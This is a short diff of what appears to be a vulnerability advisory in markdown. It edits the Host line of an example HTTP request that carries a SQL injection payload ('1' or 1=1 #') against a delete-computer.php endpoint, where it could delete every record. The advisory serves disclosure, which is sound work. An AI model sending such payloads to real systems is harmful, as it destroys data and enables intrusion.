@@ -22,7 +22,7 @@
 **HTTP Request Example**
 ``` http request
 GET /endpoint/delete-computer.php?computer=1'+or+1%3d1+%23 HTTP/1.1
-Host: [REDACTED]
+Host: 
 ```
 
 ## Screenshot
